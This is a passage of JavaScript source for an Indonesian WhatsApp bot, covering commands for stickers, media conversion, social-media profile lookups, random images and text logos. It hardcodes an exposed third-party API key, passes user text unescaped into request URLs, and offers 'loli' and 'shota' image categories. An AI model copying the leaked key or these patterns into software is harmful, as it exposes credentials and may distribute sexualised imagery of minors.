			titttttttttt += `Permukaan laut : ${data.result.permukaan_laut}\n`
			conn.sendMessage(m.chat, { location: { degreesLatitude: data.result.latitude, degreesLongitude: data.result.longitude } })
			newReply(titttttttttt)
			}
			break
			
			case 'kodepos':
			if (args.length == 0) return newReply(`Example: ${prefix + command} Slemanan or ${prefix + command} 66154`)
			newReply(mess.wait)
			var { data } = await axios.get(`https://api.lolhuman.xyz/api/kodepos?apikey=${apikey}&query=${full_args}`)
			var tittttttttttt = `Provinsi : ${data.result[0].province}\n`
			tittttttttttt += `Kabupaten : ${data.result[0].city}\n`
			tittttttttttt += `Kecamatan : ${data.result[0].subdistrict}\n`
			tittttttttttt += `Kelurahan : ${data.result[0].urban}\n`
			tittttttttttt += `Kode Pos : ${data.result[0].postalcode}`
			newReply(tittttttttttt)
			break
			
		    case 'jadwalbola':
			var { data } = await axios.get(`https://api.lolhuman.xyz/api/jadwalbola?apikey=${apikey}`)
			newReply(mess.wait)
			var titttttttttttt = 'Jadwal Bola :\n'
			for (var x of data.result) {
				titttttttttttt += `Pada : ${x.time}\n`
				titttttttttttt += `Event : ${x.event}\n`
				titttttttttttt += `Match : ${x.match}\n`
				titttttttttttt += `TV : ${x.tv}\n\n`
			}
			newReply(titttttttttttt)
			break
			
			// ANIME FITUR
			case 'genshin':
			if (args.length == 0) return newReply(`Example: ${prefix + command} jean`)
			newReply(mess.wait)
			var { data } = await axios.get(`https://api.lolhuman.xyz/api/genshin/${full_args}?apikey=${apikey}`)
			var caption = `Name : ${data.result.title}\n`
			caption += `Intro : ${data.result.intro}\n`
			caption += `Icon : ${data.result.icon}\n`
			await conn.sendMessage(m.chat, { image: { url: data.result.cover1 }, caption })
			await conn.sendMessage(m.chat, { audio: { url: data.result.cv[0].audio[0] }, mimetype: 'audio/mp4' })
			break
			
			
			// CONVERT FITUR
			
			case 'qc': {
            const { quote } = require('./lib/quote.js')
            if (!q) return ('Masukan Text')
            let ppnyauser = await await conn.profilePictureUrl(m.sender, 'image').catch(_=> 'https://telegra.ph/file/6880771a42bad09dd6087.jpg')
            const rest = await quote(q, pushname, ppnyauser)
            newReply(mess.wait)
            conn.sendImageAsSticker(m.chat, rest.result, m, { packname: `${global.packname}`, author: `${global.author}`})
            }
            break
            
            case 'qcimg': {
            const { quote } = require('./lib/quote.js')
            if (!q) return ('Masukan Text')
            let ppnyauser = await await conn.profilePictureUrl(m.sender, 'image').catch(_=> 'https://telegra.ph/file/6880771a42bad09dd6087.jpg')
            const rest = await quote(q, pushname, ppnyauser)
            newReply(mess.wait)
            conn.sendMessage(m.chat, { image: { url: rest.result }, caption: `Done?`}, {quoted: m})
            }
            break
            
			case 'sticker':
            case 'stiker':
            case 's':{
                if (!quoted) return newReply(`Balas Video/Image Dengan Caption ${prefix + command}`)
                newReply(mess.wait)
                if (/image/.test(mime)) {
                    let media = await quoted.download()
                    let encmedia = await conn.sendImageAsSticker(m.chat, media, m, {
                        packname: global.packname,
                        author: global.author
                    })
                    await fs.unlinkSync(encmedia)
                } else if (/video/.test(mime)) {
                    if ((quoted.msg || quoted).seconds > 11) return newReply('Maksimal 10 detik!')
                    let media = await quoted.download()
                    let encmedia = await conn.sendVideoAsSticker(m.chat, media, m, {
                        packname: global.packname,
                        author: global.author
                    })
                    await fs.unlinkSync(encmedia)
                } else {
                    return newReply(`Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`)
                }
            }
            break
            
            case 'smeme': {
	        let respond = `Kirim/reply image/sticker dengan caption ${prefix + command} text1|text2`
	        if (!/image/.test(mime)) return newReply(respond)
            if (!text) return newReply(respond)
	        newReply(mess.wait)
            atas = text.split('|')[0] ? text.split('|')[0] : '-'
            bawah = text.split('|')[1] ? text.split('|')[1] : '-'
	        let dwnld = await conn.downloadAndSaveMediaMessage(qmsg)
	        let fatGans = await TelegraPh(dwnld)
	        let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(bawah)}/${encodeURIComponent(atas)}.png?background=${fatGans}`
	        let FaTiH = await conn.sendImageAsSticker(m.chat, smeme, m, { packname: global.packname, author: global.auhor })
	        await fs.unlinkSync(FaTiH)
            }
	        break
	             
            case 'swm': {
                let [teks1, teks2] = text.split`|`
                if (!teks1) return newReply(`Kirim/reply image/video dengan caption ${prefix + command} teks1|teks2`)
                if (!teks2) return newReply(`Kirim/reply image/video dengan caption ${prefix + command} teks1|teks2`)
            	newReply(mess.wait)
                if (/image/.test(mime)) {
                    let media = await conn.downloadMediaMessage(qmsg)
                    let encmedia = await conn.sendImageAsSticker(m.chat, media, m, { packname: teks1, author: teks2 })
                    await fs.unlinkSync(encmedia)
                } else if (/video/.test(mime)) {
                    if ((quoted.msg || quoted).seconds > 11) return newReply('Maksimal 10 detik!')
                    let media = await conn.downloadMediaMessage(qmsg)
                    let encmedia = await conn.sendVideoAsSticker(m.chat, media, m, { packname: teks1, author: teks2 })
                    await fs.unlinkSync(encmedia)
                } else {
                    return newReply(`Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`)
                }
            }
            break
            
            case 'emojimix': {
                let [emoji1, emoji2] = text.split`+`
                if (!emoji1) return newReply(`Contoh : ${prefix + command} 😅+🤔`)
                if (!emoji2) return newReply(`Contoh : ${prefix + command} 😅+🤔`)
                newReply(mess.wait)
                let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
                for (let res of anu.results) {
                    let encmedia = await conn.sendImageAsSticker(m.chat, res.url, m, {
                        packname: global.packname,
                        author: global.author,
                        categories: res.tags
                    })
                    await fs.unlinkSync(encmedia)
                }
                
            }
            break
            
            case 'emojimix2': {
                if (!text) return newReply(`Contoh : ${prefix + command} 😅`)
                let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(text)}`)
                for (let res of anu.results) {
                    let encmedia = await conn.sendImageAsSticker(m.chat, res.url, m, {
                        packname: global.packname,
                        author: global.author,
                        categories: res.tags
                    })
                    await fs.unlinkSync(encmedia)
                }
                
            }
            break
            
            case 'attp':
                try {
                if (args.length == 0) return newReply(`Example: ${prefix + command} FallZx`)
                await conn.sendMessage(m.chat, {sticker: {url:`https://api.lolhuman.xyz/api/attp?apikey=${apikey}&text=${full_args}` }}, { quoted: m })
            } catch (e) {
                newReply(mess.error)
            }
            break
            case 'attp2':
                try {
                    if (args.length == 0) return newReply(`Example: ${prefix + command} FallZx`)
                    await conn.sendMessage(m.chat, {sticker: {url:`https://api.lolhuman.xyz/api/attp2?apikey=${apikey}&text=${full_args}` }}, { quoted: m })
                } catch (e) {
                    newReply(mess.error)
            }
            break
            case 'ttp':
                try {
                    if (args.length == 0) return newReply(`Example: ${prefix + command} FallZx`)
                    await conn.sendMessage(m.chat, {sticker: {url:`https://api.lolhuman.xyz/api/ttp?apikey=${apikey}&text=${full_args}` }}, { quoted: m })
                } catch (e) {
                    newReply(mess.error)
            }
            break
            
            case 'toimage': 
            case 'toimg': {
                if (!/webp/.test(mime)) return newReply(`Reply sticker dengan caption *${prefix + command}*`)
                newReply(mess.wait)
                let media = await conn.downloadAndSaveMediaMessage(qmsg)
                let ran = await getRandom('.png')
                exec(`ffmpeg -i ${media} ${ran}`, (err) => {
                    fs.unlinkSync(media)
                    if (err) return err
                    let buffer = fs.readFileSync(ran)
                    conn.sendMessage(m.chat, { image: buffer }, { quoted: m })
                    fs.unlinkSync(ran)
                })
                
            }
            break
	        case 'tomp4': 
	        case 'tovideo': {
                if (!/webp/.test(mime)) return newReply(`Reply stiker dengan caption *${prefix + command}*`)
                newReply(mess.wait)
                let media = await conn.downloadAndSaveMediaMessage(qmsg)
                let webpToMp4 = await webp2mp4File(media)
                await conn.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' } }, { quoted: m })
                await fs.unlinkSync(media)
                
            }
            break
            
            case 'toaud': 
            case 'toaudio': {
            if (!/video/.test(mime) && !/audio/.test(mime)) return newReply(`Kirim/Reply Video/Audio Yang Ingin Dijadikan Audio Dengan Caption ${prefix + command}`)
            newReply(mess.wait)
            let media = await conn.downloadMediaMessage(qmsg)
            let audio = await toAudio(media, 'mp4')
            conn.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : m })
            
            }
            break
            
            case 'tomp3': {
            if (!/video/.test(mime) && !/audio/.test(mime)) return newReply(`Kirim/Reply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`)
            newReply(mess.wait)
            let media = await conn.downloadMediaMessage(qmsg)
            let audio = await toAudio(media, 'mp4')
            conn.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: `Convert By FallZx .mp3`}, { quoted : m })
            
            }
            break
            
            case 'tovn': 
            case 'toptt': {
            if (!/video/.test(mime) && !/audio/.test(mime)) return newReply(`Reply Video/Audio Yang Ingin Dijadikan VN Dengan Caption ${prefix + command}`)
            newReply(mess.wait)
            let media = await conn.downloadMediaMessage(qmsg)
            let { toPTT } = require('./lib/converter')
            let audio = await toPTT(media, 'mp4')
            conn.sendMessage(m.chat, {audio: audio, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
            
            }
            break
            
            case 'togif': {
                if (!/webp/.test(mime)) return newReply(`Reply stiker dengan caption *${prefix + command}*`)
                newReply(mess.wait)
                let media = await conn.downloadAndSaveMediaMessage(qmsg)
                let webpToMp4 = await webp2mp4File(media)
                await conn.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }, gifPlayback: true }, { quoted: m })
                await fs.unlinkSync(media)
                
            }
            break
            
	        case 'tourl': {
                newReply(mess.wait)
                let media = await conn.downloadAndSaveMediaMessage(qmsg)
                if (/image/.test(mime)) {
                    let anu = await TelegraPh(media)
                    newReply(util.format(anu))
                } else if (!/image/.test(mime)) {
                    let anu = await UploadFileUgu(media)
                    newReply(util.format(anu))
                }
                await fs.unlinkSync(media)
                
            }
            break
            
            // Stalk Fitur
            case 'igstalk': {
			if (args.length == 0) return newReply(`Example: ${prefix + command} whyzzxy`)
			newReply(mess.wait)
			axios.get(`https://api.lolhuman.xyz/api/stalkig/${args[0]}?apikey=${apikey}`).then(({ data }) => {
				var caption = `Username : ${data.result.username}\n`
				caption += `Full Name : ${data.result.fullname}\n`
				caption += `Posts : ${data.result.posts}\n`
				caption += `Followers : ${data.result.followers}\n`
				caption += `Following : ${data.result.following}\n`
				caption += `Bio : ${data.result.bio}`
				conn.sendMessage(m.chat, { image: { url: data.result.photo_profile }, caption })
			})
			
			}
			break

            case 'ttstalk': {
			if (args.length == 0) return newReply(`Example: ${prefix + command} dryan.pu`)
			newReply(mess.wait)
			axios.get(`https://api.lolhuman.xyz/api/stalktiktok/${args[0]}?apikey=${apikey}`).then(({ data }) => {
				var caption = `Username : ${data.result.username}\n`
				caption += `Nickname : ${data.result.nickname}\n`
				caption += `Followers : ${data.result.followers}\n`
				caption += `Followings : ${data.result.followings}\n`
				caption += `Likes : ${data.result.likes}\n`
				caption += `Video : ${data.result.video}\n`
				caption += `Bio : ${data.result.bio}\n`
				conn.sendMessage(m.chat, { image: { url: data.result.user_picture }, caption })
			})
			
			}
			break
			
			case 'mlstalk': {
			if (args.length == 0) return newReply(`Example: ${prefix + command} 84830127/2169`)
			newReply(mess.wait)
			var { data } = await axios.get(`https://api.lolhuman.xyz/api/mobilelegend/${args[0]}?apikey=${apikey}`)
			newReply(data.result)
			
			}
			break
			
			case 'ghstalk': {
			if (args.length == 0) return newReply(`Example: ${prefix + command} FallZx`)
			newReply(mess.wait)
			axios.get(`https://api.lolhuman.xyz/api/github/${args[0]}?apikey=${apikey}`).then(({ data }) => {
				var caption = `Name : ${data.result.name}\n`
				caption += `Link : ${data.result.url}\n`
				caption += `Public Repo : ${data.result.public_repos}\n`
				caption += `Public Gists : ${data.result.public_gists}\n`
				caption += `Followers : ${data.result.followers}\n`
				caption += `Following : ${data.result.following}\n`
				caption += `Bio : ${data.result.bio}`
				conn.sendMessage(m.chat, { image: { url: data.result.avatar }, caption })
			})
			
			}
			break
			
		    case 'twstalk': {
			if (args.length == 0) return newReply(`Example: ${prefix + command} jokowi`)
			newReply(mess.wait)
			axios.get(`https://api.lolhuman.xyz/api/twitter/${args[0]}?apikey=${apikey}`).then(({ data }) => {
				var caption = `Username : ${data.result.screen_name}\n`
				caption += `Name : ${data.result.name}\n`
				caption += `Tweet : ${data.result.tweet}\n`
				caption += `Joined : ${data.result.joined}\n`
				caption += `Followers : ${data.result.followers}\n`
				caption += `Following : ${data.result.following}\n`
				caption += `Like : ${data.result.like}\n`
				caption += `Description : ${data.result.description}`
				conn.sendMessage(m.chat, { image: { url: data.result.profile_picture }, caption })
			})
			
			}
			break
			
			case 'ssweb':
                  if (args.length == 0) return newReply(`Example: ${prefix + command} https://www.google.com`)
                  newReply(mess.wait)
                  wm_dryan = args[0]
                  ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/ssweb?apikey=${apikey}&url=${wm_dryan}`)
                  conn.sendMessage(m.chat, { image: { url: ini_buffer}, caption: `Screenshot Website\n URL: ${wm_dryan}`}, {quoted: m})
            break
            
		    case 'darkjoke':
			newReply(mess.wait)
                conn.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/meme/darkjoke?apikey=${apikey}`}, caption: `Done?`}, {quoted: m})
            break

			case 'randommeme':
			newReply(mess.wait)
                conn.sendMessage(m.chat, { image: { url:  `https://api.lolhuman.xyz/api/random/meme?apikey=${apikey}`}, caption: `Done?`}, {quoted: m})
            break
            
			case 'memeindo':
                newReply(mess.wait)
                conn.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/meme/memeindo?apikey=${apikey}`}, caption: `Done?`}, {quoted: m})
            break
			
			
			// Ramdon Foto
			case 'art':
            case 'bts':
            case 'exo':
            case 'elf':
            case 'loli':
            case 'neko':
            case 'waifu':
            case 'shota':
            case 'husbu':
            case 'sagiri':
            case 'shinobu':
            case 'megumin':
            case 'wallnime': {
				if (!isPremium) return newReply(mess.prem)
				newReply(mess.wait)
				conn.sendMessage(m.chat, { image: { url: `http://api.lolhuman.xyz/api/random/${command}?apikey=${apikey}`}, caption: `Random image for ${command}`})
		    }
	        break
	        
	        // Creator Image
	        case 'bucinsertifikat':
		    case 'sertifikatbucin':
			case 'bucincert':
				if (args.length == 0) return newReply(`Example: ${prefix + command} Justimun Kentod`)
				newReply(mess.wait)
				kueri = args.join(" ")
                conn.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/bucinserti?apikey=${apikey}&name=${kueri}`}, caption: 'Sertifikatnya kack'}, {quoted: m})
            break
            
			case 'tololsert':
			case 'tololcert':
			case 'tololsertifikat':
			if (args.length == 0) return newReply(`Example: ${prefix + command} Justimun Kentod`)
			newReply(mess.wait)
			ytta = args.join(" ")
            conn.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/toloserti?apikey=${apikey}&name=${ytta}`}, caption: 'Sertifikatnya kack'}, {quoted: m})
            break
            
			case 'pacarsertifikat':
			case 'pacarcert':
            if (args.length == 0) return newReply(`Usage: ${prefix + command} nama1|nama2`)
            newReply(mess.wait)
                get_args = args.join(" ").split("|")
                nik = get_args[0]
                prov = get_args[1]
			    titidnya = `Selamat yaa ${nik} ❤️ ${prov}`
            conn.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/pacarserti?apikey=${apikey}&name1=${nik}&name2=${prov}`}, caption: titidnya}, {quoted: m})
            break
	        
	        case 'carbon':
	            if (!q) return newReply(`Example: ${prefix + command} const adrian = required('adrian-api')`)
	            newReply(mess.wait)
	            conn.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/carbon?apikey=${apikey}&code=${q}&language=nodejs`}, caption: `Created By FallZx\n\n\nCode:\n\n${q}`}, {quoted: m})
	        break
	     
	    // Ephoto1
	    case 'wetglass':
		case 'multicolor3d':
		case 'watercolor':
		case 'luxurygold':
		case 'galaxywallpaper':
		case 'lighttext':
		case 'beautifulflower':
		case 'puppycute':
		case 'royaltext':
		case 'heartshaped':
		case 'birthdaycake':
		case 'galaxystyle':
		case 'hologram3d':
		case 'greenneon':
		case 'glossychrome':
		case 'greenbush':
		case 'metallogo':
		case 'noeltext':
		case 'glittergold':
		case 'textcake':
		case 'starsnight':
		case 'wooden3d':
		case 'textbyname':
		case 'writegalacy':
		case 'galaxybat':
		case 'snow3d':
		case 'birthdayday':
		case 'goldplaybutton':
		case 'silverplaybutton':
		case 'freefire':
			if (args.length == 0) return reply(`Example: ${prefix + command} AdrianTzy `)
			if (!isPremium && global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
            db.data.users[m.sender].limit -= 2 // -1 limit
			newReply(mess.wait)
			conn.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/ephoto1/${command}?apikey=${apikey}&text=${args}`}, caption: `Created By FallZx\n\n Type: ${command}\n\nText: ${args}`})
			break

        case 'shadow':
		case 'cup':
		case 'cup1':
		case 'romance':
		case 'smoke':
		case 'burnpaper':
		case 'lovemessage':
		case 'undergrass':
		case 'love':
		case 'coffe':
		case 'woodheart':
		case 'woodenboard':
		case 'summer3d':
		case 'wolfmetal':
		case 'nature3d':
		case 'underwater':
		case 'golderrose':
		case 'summernature':
		case 'letterleaves':
		case 'glowingneon':
		case 'fallleaves':
		case 'flamming':
		case 'harrypotter':
		case 'carvedwood':
			if (args.length == 0) return reply(`Example: ${prefix + command} AdrianTzy`)
			if (!isPremium && global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
            db.data.users[m.sender].limit -= 2 // -1 limit
			newReply(mess.wait)
			conn.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/photooxy1/${command}?apikey=${apikey}&text=${args}`}, caption: `Created By AdrianTzy\n\n Type: ${command}\n\nText: ${args}`})
			break

    // Text Prome
        case 'pornhub':
		case 'glitch':
		case 'avenger':
		case 'space':
		case 'ninjalogo':
		case 'marvelstudio':
		case 'lionlogo':
		case 'wolflogo':
		case 'steel3d':
		case 'wallgravity':
			if (args.length == 0) return reply(`Example: ${prefix + command} AdrianTzy`)
			if (!isPremium && global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
            db.data.users[m.sender].limit -= 4 // -1 limit
			newReply(mess.wait)
			conn.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/textprome2/${command}?apikey=${apikey}&text1=${args[0]}&text2=${args[1]}`}, caption: `Created By AdrianTzy\n\n Type: ${command}\n\nText: ${args}`})
			break

        case 'blackpink':
		case 'neon':
		case 'greenneon':
		case 'advanceglow':
		case 'futureneon':
		case 'sandwriting':
		case 'sandsummer':
		case 'sandengraved':
		case 'metaldark':
		case 'neonlight':
		case 'holographic':
		case 'text1917':
		case 'minion':
		case 'deluxesilver':
		case 'newyearcard':
		case 'bloodfrosted':
		case 'halloween':
		case 'jokerlogo':
		case 'fireworksparkle':
		case 'natureleaves':
		case 'bokeh':
		case 'toxic':
		case 'strawberry':
		case 'box3d':
		case 'roadwarning':
		case 'breakwall':
		case 'icecold':
		case 'luxury':
		case 'cloud':
		case 'summersand':
		case 'horrorblood':
		case 'thunder':
			if (args.length == 0) return newReply(`Example: ${prefix + command} AdrianTzy`)
			if (!isPremium && global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
            db.data.users[m.sender].limit -= 2 // -1 limit
			newReply(mess.wait)
			conn.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/textprome/${command}?apikey=${apikey}&text=${args}` }, caption: `Created By AdrianTzy\n\n Type: ${command}\n\nText: ${args}`})
			break
	    
	    case 'akira':
            case 'akiyama':
            case 'ana':
            case 'asuna':
            case 'ayuzawa':
            case 'boruto':
            case 'chitoge':
            case 'deidara':
            case 'doraemon':
            case 'elaina':
            case 'emilia':
            case 'erza':
            case 'gremory':
            case 'hestia':
            case 'hinata':
            case 'inori':
            case 'isuzu':
            case 'itachi':
            case 'itori':
            case 'kaga':
            case 'kagura':
            case 'kakasih':
            case 'kaori':
            case 'keneki':
            case 'kotori':
            case 'kurumi':
            case 'loli':
            case 'madara':
            case 'mikasa':
            case 'miku':
            case 'minato':
            case 'naruto':
            case 'nezuko':
            case 'onepiece':
            case 'pokemon':
            case 'rize':
            case 'sagiri':
            case 'sakura':
            case 'sasuke':
            case 'shina':
            case 'shinka':
            case 'shizuka':
            case 'shota':
            case 'toukachan':
            case 'tsunade':
            case 'yuki': {
                newReply(mess.wait)
                if (!isPremium && global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 1 // -1 limit
                let anu = await fetchJson(`https://raw.githubusercontent.com/Abuzzpoet/Databasee/main/Random%20Anime/${command}.json`)
                result = anu[Math.floor(Math.random() * anu.length)]               
                conn.sendMessage(m.chat, { image: { url: result}, caption: (mess.done) }, { quoted: m })
        }
        break
        case 'aesthetic':
            case 'anjing':
            case 'blankpink':
            case 'boneka':
            case 'darkjokes':
            case 'hekel':
            case 'justina':
            case 'kpop':
            case 'kucing':
            case 'mobil':
            case 'motor':
            case 'pubg':
            case 'rose':
            case 'ryujin':
            case 'wallhp': {
            newReply(mess.wait)
                if (!isPremium && global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 1 // -1 limit
                let anu = await fetchJson(`https://raw.githubusercontent.com/Abuzzpoet/Databasee/main/Random%20Image/${command}.json`)
                result = anu[Math.floor(Math.random() * anu.length)]               
                conn.sendMessage(m.chat, { image: { url: result}, caption: mess.done }, { quoted: m })
            }
        break
			case 'cyberspace':
            case 'mountain':
            case 'programming':
            case 'technology': {
            newReply(mess.wait)
                if (!isPremium && global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 1 // -1 limit
                let anu = await fetchJson(`https://raw.githubusercontent.com/Abuzzpoet/Databasee/main/Wallpaper/${command}.json`)
                result = anu[Math.floor(Math.random() * anu.length)]               
                conn.sendMessage(m.chat, { image: { url: result}, caption: mess.done }, { quoted: m })
            }
            break
            case 'cecan':
            case 'china':
            case 'cogan':
            case 'indonesia':
            case 'japan':
            case 'korea':
            case 'malaysia':
            case 'thailand':
            case 'vietnam': {
                newReply(mess.wait)
                if (!isPremium && global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 1 // -1 limit
                let anu = await fetchJson(`https://raw.githubusercontent.com/Abuzzpoet/Databasee/main/Cecan/${command}.json`)
                result = anu[Math.floor(Math.random() * anu.length)]               
                conn.sendMessage(m.chat, { image: { url: result}, caption: mess.done }, { quoted: m })
            }
            break
            case 'couple': {
                let anu = await fetchJson('https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json')
                newReply(mess.wait)
                if (!isPremium && global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 1 // -1 limit
                let random = anu[Math.floor(Math.random() * anu.length)]
                conn.sendMessage(m.chat, {
                    image: {
                        url: random.male
                    },
                    caption: `Couple Male`
                }, {
                    quoted: m
                })
                conn.sendMessage(m.chat, {
                    image: {
                        url: random.female
                    },
                    caption: `Couple Female`
                }, {
                    quoted: m
                })
            }
            break
            case 'wallpaper': {
                if (!text) return newReply('Mau Cari Wallpaper Apa?')
                newReply(mess.wait)
                if (!isPremium && global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 1 // -1 limit
                let {
                    wallpaper
                } = require('./lib/scraper')
                anu = await wallpaper(text)
                result = anu[Math.floor(Math.random() * anu.length)]
                conn.sendMessage(m.chat, { image: { url: result}, caption: mess.done}, { quoted: m })
            }
            break
            case 'wikimedia': {
                if (!text) return newReply('Mau Cari Wikimedia Apa?')
                newReply(mess.wait)
                if (!isPremium && global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 1 // -1 limit
                let {
                    wikimedia
                } = require('./lib/scraper')
                anu = await wikimedia(text)
                result = anu[Math.floor(Math.random() * anu.length)]
                conn.sendMessage(m.chat, { image: { url: result}, caption: mess.done}, { quoted: m })
            }
            break
            
            case 'tohd':
            case 'remini': {
                    if (!isPremium && global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
                    db.data.users[m.sender].limit -= 5 // -1 limit
                    if (!quoted) return newReply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
                    if (!/image/.test(mime)) return newReply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
                    if (/webp/.test(mime)) return newReply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
                    newReply(mess.wait)
                    const media = await conn.downloadAndSaveMediaMessage(quoted)
                    const anu = await TelegraPh(media)
                    let get_result = await getBuffer(`https://api.lolhuman.xyz/api/imagetoanime?apikey=${apikey}&img=${anu}`)
                    conn.sendMessage(m.chat, { image: { url: get_result }, caption: (mess.done) }, { quoted: m})
            }
            break
			
			case 'jadianime':
                if (!isPremium && global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit)
                db.data.users[m.sender].limit -= 10
                if (!isMedia) return newReply(`Kirim gambar lalu reply ${prefix + command} atau tag gambar yang sudah dikirim`)
                newReply(mess.wait)
                let anu = await conn.downloadAndSaveMediaMessage(quoted)
                let wm_dryan = await TelegraPh(anu)
                let get_result = await getBuffer(`https://api.lolhuman.xyz/api/imagetoanime?apikey=${apikey}&img=${anu}`)
                conn.sendMessage(m.chat, { image: { url: get_result}, caption: mess.done})
            break

            case 'logo1':
            if (!isPremium && global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit)
            db.data.users[m.sender].limit -= 2
            if (!text) return reply(`Example: ${prefix + command} AdrianTzy`)
			conn.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/ephoto1/fpslogo?apikey=${lolhuman}&text=${text}` } })
			break
			case 'logo2':
			if (!isPremium && global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit)
            db.data.users[m.sender].limit -= 2
            if (!text) return reply(`Example: ${prefix + command} AdrianTzy`)
			conn.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/ephoto1/logogaming?apikey=${lolhuman}&text=${text}` } })
			break
			case 'logo3':
			if (!isPremium && global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit)
            db.data.users[m.sender].limit -= 2
            if (!text) return reply(`Example: ${prefix + command} AdrianTzy`)
			conn.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/ephoto1/metallogo?apikey=${lolhuman}&text=${text}` } })
			break
			case 'logo4':
			if (!isPremium && global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit)
            db.data.users[m.sender].limit -= 2
            if (!text) return reply(`Example: ${prefix + command} AdrianTzy`)
			conn.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/textprome/jokerlogo?apikey=${lolhuman}&text=${args[0]}` } })
			break
            
			case 'nomerhoki': case 'nomorhoki': {
                if (!Number(text)) return newReply(`Contoh : ${prefix + command} 6288292024190`)
                let anu = await primbon.nomer_hoki(Number(text))
                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Nomor HP :* ${anu.message.nomer_hp}\n• *Angka Shuzi :* ${anu.message.angka_shuzi}\n• *Energi Positif :*\n- Kekayaan : ${anu.message.energi_positif.kekayaan}\n- Kesehatan : ${anu.message.energi_positif.kesehatan}\n- Cinta : ${anu.message.energi_positif.cinta}\n- Kestabilan : ${anu.message.energi_positif.kestabilan}\n- Persentase : ${anu.message.energi_positif.persentase}\n• *Energi Negatif :*\n- Perselisihan : ${anu.message.energi_negatif.perselisihan}\n- Kehilangan : ${anu.message.energi_negatif.kehilangan}\n- Malapetaka : ${anu.message.energi_negatif.malapetaka}\n- Kehancuran : ${anu.message.energi_negatif.kehancuran}\n- Persentase : ${anu.message.energi_negatif.persentase}`, m)
            }
            break
            case 'artimimpi': case 'tafsirmimpi': {
                if (!text) return newReply(`Contoh : ${prefix + command} belanja`)
                let anu = await primbon.tafsir_mimpi(text)
                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Mimpi :* ${anu.message.mimpi}\n• *Arti :* ${anu.message.arti}\n• *Solusi :* ${anu.message.solusi}`, m)
            }
            break
            case 'ramalanjodoh': case 'ramaljodoh': {
                if (!text) return newReply(`Contoh : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`)
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.ramalan_jodoh(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Nama Anda :* ${anu.message.nama_anda.nama}\n• *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n• *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n• *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'ramalanjodohbali': case 'ramaljodohbali': {
